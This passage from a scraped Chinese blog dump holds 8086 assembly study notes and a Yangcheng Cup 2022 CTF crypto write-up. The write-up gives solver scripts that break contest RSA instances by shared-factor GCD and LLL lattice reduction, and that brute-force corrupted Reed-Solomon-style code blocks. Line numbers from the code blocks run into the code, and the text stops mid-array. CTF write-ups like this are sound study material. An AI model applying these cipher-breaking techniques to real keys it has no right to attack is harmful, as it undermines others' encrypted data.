;执行后，(ax)=4。adc执行时，相当于计算：(ax)+1+CF=2+1+1=4 可以看出，adc指令比add指令多加了一个CF位的值 adc指令的意义：举例：0198H和0183H是如何相加的 可以看出，加法可以分两步进行：①低位相加；②高位相加再加上低位相加产生的进位值 即，下面的指令与add ax,bx等价： 12add al,bladc ah,bh 11.7 sbb指令sbb是带借位减法指令，它利用了CF位上记录的错位值 123指令格式： sbb 操作对象1, 操作对象2功能： 操作对象1=操作对象1-操作对象2-CF比如指令 sbb ax,bx，实现的功能是：(ax)=(ax)-(bx)-CF 11.8 cmp指令cmp是比较指令，其功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。其他相关指令通关识别这些被影响 的标志寄存器位来得知比较结果。 指令格式： 1cmp 操作对象1, 操作对象2 比如：cmp ax,ax，结果为0，但并不在ax中保存，仅影响flag的相关各位。指令执行后：zf=1,pf=1,sf=0,cf=0,of=0 CPU在执行cmp指令的时候，也包含两种含义：进行无符号运算和进行有符号数运算。 cmp操作结果sf=1，不能说明操作对象1&lt;操作对象2： 实际结果与逻辑结果的正负的距离，在于是否发生了溢出，如果没有溢出发生，那么实际结果的正负和逻辑上真正结果的正负一致 因此，在考查sf(得知实际结果的正负)的同时考察of(是否发生溢出)，即可以得知逻辑上真正结果的正负，同时可以直到比较的结果。 11.9 检测比较结果的条件转移指令因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(zf、cf)和根据有符号数的比较结果进行转移的条件转移指令(sf、of、zf) 11.10 DF标志和串传送指令flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。 df=0 每次操作后si、di递增 df=1 每次操作后si、di递减 串传送指令：movsb 功能：相当于以下几步： 1234567((es)*16+(di))=((ds)*16+(si)); 如果df=0则：(si)=(si)+1(di)=(di)+1; 如果df=1则：(si)=(si)-1(di)=(di)-1 可以看出，movsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df位的值，将si和di递增或递减 当然也可以传送一个字：movsw，此时si和di递增2或递减2 movsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用： 1234rep movsb;等价于s: movsbloop s 可见，rep作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次,ovsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。 由于flag的df位决定着串传送指令执行后，si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使程序员能决定传送的方向 8086CPU提供以下两条指令对df位进行设置： 12cld; 将标志寄存器的df位置0std; 将标志寄存器的df位置1 11.11 pushf 和 popfpushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据，送入标志寄存器中。 11.12 标志寄存器在Debug中的表示","link":"/2022/03/31/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-9-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"},{"title":"汇编语言（1）寄存器（内存访问）","text":"最近只想摸鱼 3.1 内存中字的存储 字单元，即存放一个字形数据（16位）的内存单元，有两个地址连续的内存单元组成。 图中字形数据4E20H的低位字节存放在0号单元中，高位字节存放在1号单元中 （在这里复习下大端存储和小段存储：) 大端存储：数据的低位保存在内存中的高地址中，数据的高位保存在内存的低地址中 小端存储：数据的高位保存在内存中的高地址中，数据的低位保存在内存的低地址中 3.2 DS和[address]8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址。 比如要读取10000H单元的内容，可用如下程序段进行： 123mov bx,1000Hmov ds,bxmov a1,[0] “[…]”表示一个内存单元，其中的0表示偏移地址。 另：8086CPU不支持直接将数据送入段寄存器，即不能直接：mov ds,1000H。需要一个寄存器进行中继的操作。 3.7 栈在内存中划出一段空间当作栈使用，栈的地址存放在寄存器SS中，寄存器SP则指向栈顶的位置。因此，任意时刻，SS:SP指向栈顶元素。 push指令：1push ax 这段指令的意义为将寄存器ax的值压入栈中，有以下两步完成： pop指令1pop ax 这段指令的意义为将栈顶的值赋给ax，有以下两步完成： 值得注意的是，pop操作后，1000CH处的2266H仍存在，尽管它已不在栈中。当有新的元素Push入栈时，则会在上面覆写新的数据。 栈空的状态 3.8 栈越界8086CPU不保证我们对栈的操作不会越界 3.10 栈段 答案：SP=0。（寄存器SP只能存储16位的数据，因此需要模2^16。假设pop一个元素，SP-=2，SP=FFFEH） 总结：​ 一段内存，是代码段，还是数据存储空间，还是栈空间，取决于寄存器中CS、IP、SS、SP、DS的指向。 ​ CS:IP指向的地方位代码段，SS:SP指向的地方为栈空间，DS存放数据段地址。 附上一段代码，此处说明了一段内存既可以是代码段，可以是数据的存储空间，也可以是栈空间：","link":"/2022/01/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%881%EF%BC%89%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89/"},{"title":"汇编语言（八） CALL和RET指令","text":"10.1 ret和retfret指令用栈中的数据，修改IP的内容，从而实现近转移 retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移 CPU执行ret指令时，进行下面两步操作： （1）(IP)=((ss)*16+(sp)) （2）(sp)=(sp)+2 CPU执行retf指令时，进行下面4步操作： （1）(IP)=((ss)*16+(sp)) （2）(sp)=(sp)+2 （3）(CS)=((ss)*16+(sp)) （4）(sp)=(sp)+2 通过汇编语法理解： ret相当于 1pop IP retf相当于 12pop IPpop CS 10.2 call指令CPU执行call指令时，进行两步操作 将当前IP或CS和IP压入栈中 转移 call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令原理相同 具体方法见以下几节 10.3 依据位移进行转移的call指令1call 标号;将当前IP压栈后，转到标号处执行指令 CPU操作过程： (sp)=(sp)-2 ((ss)*16+(sp)=(IP)) (IP)=(IP)+16位位移 相当于： 12push IPjmp near ptr 标号 10.4 转移的目的地址在指令中的call指令1call far ptr 标号 ;实现段间转移 CPU操作过程： (sp)=(sp)-2 ((ss)*16+(sp)=(CS)) (sp)=(sp)-2 ((ss)*16+(sp)=(IP)) (CS)=标号所在段地址 (IP)=标号在段中的偏移地址 相当于： 123push CSpush IPjmp far ptr 标号 10.5 转移地址在寄存器中的call指令1call 16位reg CPU操作过程： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(16位reg) 相当于： 12push IPjmp 16位reg 10.6 转移地址在内存中的call指令两种格式： 1call word ptr 内存单元地址 执行该指令时相当于： 12push IPjmp word ptr 内存单元地址 另外一种： 1call dword ptr 内存单元地址 执行该指令时相当于： 123push CSpush IPjmp dword ptr 内存单元地址 10.7 call和ret的配合使用利用call和ret实现子程序的机制，具有子程序的源程序框架如下： 1234567891011121314151617181920assume cs:codecode segment main: ; ; call sub1 ;调用子程序sub1 ; ; mov ax,4c00h int 21h sub1: ; 子程序sub1开始 ; call sub2 ;调用子程序sub2 ; ret ;子程序返回 sub2: ; 子程序sub2开始 ; ; ret code ends end main 10.8 mul指令mul为乘法指令，注意以下两点： 格式如下： 1234mul regmul 内存单元;mul byte ptr ds:[0]mul word ptr [bx+si+8] 例如：计算100*10000 123mov ax,100mov bx,10000mul bx 10.9 模块化程序设计利用call和ret指令，相关问题见以下几节 10.10 参数和结果传递的问题使用寄存器和堆栈来传递参数和结果 10.11 批量数据的传递传递批量数据时，可以传递内存空间的首地址代替 10.12 寄存器冲突的问题问题：子程序中使用的寄存器，很可能在主程序中也要使用，造成了寄存器使用上的冲突 基于原则： 不发生寄存器冲突 编写调用子程序的程序的时候不必关心子程序到底使用了哪些寄存器 编写子程序的时候不必关心调用者使用了哪些寄存器 提出解决方法： 在子程序开始前将相关寄存器的值保存起来，在返回前将其恢复，可以使用栈实现。 注：该章测试点挺有意思，值得回看 实验十","link":"/2022/03/05/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E5%85%AB%EF%BC%89-CALL%E5%92%8CRET%E6%8C%87%E4%BB%A4/"},{"title":"汇编语言（3） [BX]和loop指令","text":"摸鱼才是正义！ 5.0 前置定义[bx]是什么[bx]和[0]类似，表示内存中的偏移地址，不同的是[bx]中的偏移地址存放在bx寄存器中，如下面的指令： 1mov ax,[bx] 表示将一个内存单元的内容送入ax，这个内存单元的长度为2字节，段地址在寄存器ds中，偏移地址在bx中。 loop循环 书中定义的描述性符号：“()”书中使用“()”来表示一个寄存器或一个内存单元中的内容，”()“中的内容可以有3中类型：①寄存器名 ② 段寄存器名 ③ 内存单元的物理地址。比如： (ax)表示ax中的内容、(al)表示al中的内容、(20000H)表示内存20000H单元的内容 约定符号idata表示常量1mov ax,[idata] 可以表示 mov ax,[1]、mov ax,[2]等 5.1 [BX]5.2 LoopCPU执行loop指令时，要进行两步操作： (cx)=(cx)-1 判断cx中的值，不为零则转至标号处执行程序，为零则向下执行 以计算2^12的值为例进行分析 1234567891011assume cs:codecode segment mov ax,2 mov cx,11s: add ax,ax loop s mov ax,4c00h int 21hcode endsend 代码中有一个标号s，实际上它标识了一个地址，该地址处有一条指令： add ax,ax 用cx和loop指令配合实现循环功能的程序框架如下： 1234mov cx,循环次数s: 循环执行的程序段 loop s 5.4 Debug和汇编编译器masm对指令的不同处理对于如下指令，debug和masm有不同的处理： 1mov ax,[0] debug中表示将ds:0的数据送入ax中 masm则将其当作指令 “mov ax,0”处理 那么如何在源程序中将ds:0的内存送入al中？ 将偏移地址送入bx中，用[bx]的方式访问内存单元（比较麻烦） 在”[]”前显式给出地址所在的段寄存器，如访问2000：0单元： 123mov ax,2000hmov ds,axmov al,ds:[0] 5.5 loop和[bx]的联合应用在实际中，需要用循环处理地址连续的内存单元中的数据的问题，此时可应用“mov al,[bx]”，通过改变bx中的数值，改变访问的内存单元 5.6 段前缀可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器，如 1234mov ax,ds:[bx] 或mov ax,cs:[bx] 或mov ax,ss:[bx]... 5.7 一段安全的空间在不能确定一段内存空间是否存放着重要的数据或代码时，不能随意向其中写入内容 DOS方式下，一般情况，0:200~0:2ff这段空间没有系统或其他程序的数据或代码 5.8 段前缀的使用附：实验4 [bx]和loop的使用 编程，向内存0:200~0:23f依次传送数据0~63(3FH) 12345678910111213141516ASSUME CS:CODECODE segment mov ax,0 mov ds,ax mov cx,64 mov bx,200hs: mov [bx],ax inc ax inc bx loop s mov ax,4c00h int 21hcode endsend 编程，向内存0:200~0:23f依次传送数据0~63(3FH)，程序中只能使用9条指令，9条指令中包括”mov ax,4c00h”和”int 21h” 123456789101112131415ASSUME CS:CODECODE segment mov ax,20 mov ds,ax mov cx,63 mov bx,0hs: mov [bx],bx inc bx loop s mov ax,4c00h int 21hcode endsend 下面程序的功能是将 “mov ax,4c00h”之前的指令复制到内存 12345678910111213141516ASSUME CS:CODEcode segment mov ax,CS mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,17hs: mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend （17h是先设定一个值，到debug中看内存中程序的长度才得到的） 如有错误，还望指正","link":"/2022/01/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%883%EF%BC%89-BX-%E5%92%8Cloop%E6%8C%87%E4%BB%A4/"},{"title":"羊城杯2022 wp","text":"羊城杯2022 writeup[TOC] EasyRsa对题目所给的n求最大公因数，发现这些n的最大公因数都为同一素数p，然后就按照一般解法求解即可 1234567891011121314151617181920212223242526272829303132import gmpy2from Crypto.Util.number import long_to_bytesc = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727n=[65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619,86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499,57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547,52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269,79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243,73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879,89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763,66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643,79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213,70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189,51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663,87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919]# for i in range(len(n)):# for j in range(i+1,len(n)):# if gmpy2.gcd(n[i],n[j]!=1):# print(gmpy2.gcd(n[i],n[j]))p=7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897 q=[]e=65537for i in range(len(n)): q.append(n[i]//p) if n[i]%p!=0: print('???')for i in range(len(n)-1,-1,-1): phi=(p-1)*(q[i]-1) d=gmpy2.invert(e,phi) c=pow(c,d,n[i])print(long_to_bytes(c)) LRSA题目描述 12345678910111213141516171819202122232425262728293031323334import gmpy2from pwn import *from hashlib import sha256import stringfrom Crypto.Util.number import *from random import *from Crypto.Util.number import *import gmpy2from flag import flagm=bytes_to_long(flag)def getPQ(p,q): P=getPrime(2048) Q=getPrime(2048) t=(p*P-58*P+q)%Q assert (isPrime(Q)) return P,Q,tB=getRandomNBitInteger(11)p=getPrime(B)q=getPrime(B)n=p*qe=65537c=pow(m,e,n)P,Q,t=getPQ(p,q)print(&quot;B=&quot;,B)print(&quot;P*P*Q=&quot;,P*P*Q)print(&quot;P*Q*Q=&quot;,P*Q*Q)print(&quot;t=&quot;,t)print(&quot;c=&quot;,c) 题目给了 $PPQ, QQP$ 的信息，通过求最大公因数可以得到 $N=PQ$ 的信息，接着由t的等式 t=p*P-58*P+q+k*Q有题目信息自然联想到等式两边乘$PQ$，这样可以得到 t*PQ=(p-58)*PPQ+q*PQ+k*PQQ继续整理 (p-58)*PPQ+(q-t)*PQ+k*PQQ=0以上等式中，PPQ、PQ、PQQ的位数在4096位，而$p-58, q-t$的位数为1024位左右，构建以下格子，通过LLL算法，可以得到$p-58,q-t$ \\left( \\begin{matrix} 1&0&0\\\\ 0&1&0\\\\ PPQ&PQ&PQQ \\end{matrix} \\right)脚本如下 LLL算法得到$p-58$和$q-t$ 123456789101112131415import gmpy2from Crypto.Util.number import long_to_bytesB=1023PPQ=17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981PQQ=17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909t=44c=4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746PQ=gmpy2.gcd(PPQ,PQQ)v1=vector(ZZ,[1,0,PPQ])v2=vector(ZZ,[0,1,PQ])v3=vector(ZZ,[0,0,PQQ])m=matrix([v1,v2,v3])ml=m.LLL()print(ml[0]) 得到flag 1234567891011import gmpy2from Crypto.Util.number import long_to_bytes,isPrimep=-80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205q=-71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407p=-pq=-qp=p+58q=q+tphi=(p-1)*(q-1)d=gmpy2.invert(65537,phi)print(long_to_bytes(pow(c,d,p*q))) Solomen’s puzzle 1题目描述 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# type: ignorem = 257F = Zmod(m)alpha = F(223)PR.&lt;x&gt; = PolynomialRing(F)gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)def encode_block(message): assert isinstance(message, list) f = PR([0] * 4 + message) px = f % gx mx = f - px c = [_ for _ in mx] return c + (8 - len(c)) * [0]def encode(byte_stream): length = len(byte_stream) if length % 4 != 0: padding = (length // 4 + 1) * 4 - length byte_stream += padding * b'\\x00' length += padding code = b'' for i in range(0, length, 4): block = byte_stream[i:i+4] block_code = encode_block([each for each in block]) code += bytes(block_code) return codefrom secret import flag, p, qfrom Crypto.Util.number import bytes_to_long, long_to_bytesfrom random import randrangen = p * qe = 10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591cipher = bytes_to_long(flag) * e % ncode = encode(long_to_bytes(cipher))code = [each for each in code]for i in range(0, 256, 8): index1 = randrange(4, 8) value1 = randrange(0, 256) index2 = randrange(4, 8) value2 = randrange(0, 256) code[i + index1] = value1 code[i + index2] = value2print(n)print(bytes(code)) 将题目所给的code还原为多项式，而多项式的高四次幂对应的系数本应是flag的信息，但其中两位被替换为了随机数。 而模多项式具有一种校验错误的功能，通过保留的低四位，我们可以通过爆破原来的高四位，检验式子在模运算后是否与code对应的低四位相同，从而还原原来的高四位，进而得到flag 123456789101112131415161718192021222324252627print('start')n=94257413713770111563970534929325680923943690882102478219183863722026590313165304301118258536360712467357451726680293716779730218553691126214750969333228034756948476572806064756873382054384808713137658321644158757777088916851366208046581218865015163572359836440643828462291397248680038931998325006839692797347code='\\xb9$5.&gt;\\xff\\xe3S\\xc91\\xb2\\xeb\\x1byR(\\x12{\\xc4\\xbf\\xa4wo|\\xc5-;\\xc9\\xc9S[\\xaeX\\xad\\xf0\\xef@\\x1c\\x87]\\x9a\\xb9:\\x8cu\\xa5\\xe3EA&lt;&quot;\\xfd\\x9a\\xbfqB\\x94\\xc3R\\x95\\xd5\\xbd\\xd0\\x10u\\x10\\xe3\\xa5&quot;S\\xed\\xd0\\xf8\\x02\\xbf\\x124A~1]\\xceP\\xdf\\xf2Cr1\\x93\\xacw\\x03\\tQe\\xcc2b\\xbf\\x0f\\x92\\xad\\x19\\x00\\xab|\\xf3\\xc9\\x9b&amp;I%\\xf5\\x9b#\\xf7\\xa2\\xcb\\xb1\\x0c\\xee\\xb56\\xd5\\xd2\\xd5[?^\\x9d\\x8b\\x93\\xbe\\x832\\xee\\xa9\\xa5\\x83$\\xe9\\xe5\\x95\\x01\\xd6\\x9f\\xad\\x1f\\x90\\xc3]aL\\x10\\x07{#4i^\\xae\\xdf|\\x9f\\x94\\xf4\\xaf\\x06R\\x86j&amp;\\xeb\\x0b\\x06\\xcf\\xb2\\x8e\\xb4\\xb9s\\x97[\\xf1ip\\x06\\xf8\\xfdFs\\xf1`\\xc6\\x82\\xd8\\xce\\xf6\\x95{\\xe3\\x8cQ\\xed\\xef\\xe9\\xb9\\'\\x19\\xdf^\\xc8\\x81\\xde\\x1fQ\\x1e\\x86\\xda\\xf8\\xfd4M0#\\xef\\x8a\\xe9\\xe5\\xfc\\xe2\\xe3\\xe6\\xd0e\\xce\\xe1\\x0b\\x9eM\\x07\\xc2Y\\xf8B\\xe1\\xde\\xfaP\\xe9\\x9d\\xde\\xc3\\xe3C\\xa5'# code='\\xe2x\\xbf\\xd0DASC\\xeb\\x8aC\\x05TF{1\\x94\\xcc\\x01\\x8c234}Y\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xcaY\\xb0\\xe5\\xf0\\xca\\xca\\xca\\xca'm = 257F = Zmod(m)alpha = F(223)PR.&lt;x&gt; = PolynomialRing(F)gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)flag=[]for i in range(0,len(code),8): c=[] for j in range(8): c.append(ord(code[i+j])) for r1 in range(256): for r2 in range(256): for set1 in range(4,8): for set2 in range(set1+1,8): tmpF=[0]*4+c[4:] tmpF[set1]=r1 tmpF[set2]=r2 tmpF=PR(tmpF) tmpC=tmpF-tmpF%gx tmpC=[_ for _ in tmpC] if tmpC[:4]==c[:4]: print(tmpC,i)print(flag) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import gmpy2from Crypto.Util.number import long_to_bytesn=94257413713770111563970534929325680923943690882102478219183863722026590313165304301118258536360712467357451726680293716779730218553691126214750969333228034756948476572806064756873382054384808713137658321644158757777088916851366208046581218865015163572359836440643828462291397248680038931998325006839692797347e=10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591a=[[185, 36, 53, 46, 62, 255, 227, 164],[201, 49, 178, 235, 27, 121, 124, 93],[18, 123, 196, 191, 164, 252, 111, 230],[197, 45, 59, 201, 201, 154, 91, 80],[88, 173, 240, 239, 32, 28, 135, 93],[154, 185, 58, 140, 30, 165, 227, 69],[65, 60, 34, 253, 154, 191, 113, 158],[148, 195, 82, 149, 213, 189, 208, 101],[117, 16, 227, 165, 34, 24, 237, 208],[248, 2, 191, 18, 52, 65, 126, 69],[93, 206, 80, 223, 242, 21, 114, 49],[147, 172, 119, 3, 201, 81, 101, 204],[50, 98, 191, 15, 200, 173, 25, 19],[171, 124, 243, 201, 248, 38, 73, 187],[245, 155, 35, 247, 162, 203, 226, 12],[238, 181, 54, 213, 48, 213, 18, 63],[94, 157, 139, 147, 190, 103, 50, 148],[169, 165, 131, 36, 138, 229, 149, 11],[214, 159, 173, 31, 196, 195, 220, 97],[76, 16, 7, 123, 41, 52, 105, 94],[174, 223, 124, 159, 148, 132, 175, 150],[82, 134, 106, 38, 93, 11, 100, 207],[178, 142, 180, 185, 115, 252, 91, 142],[105, 112, 6, 248, 253, 64, 115, 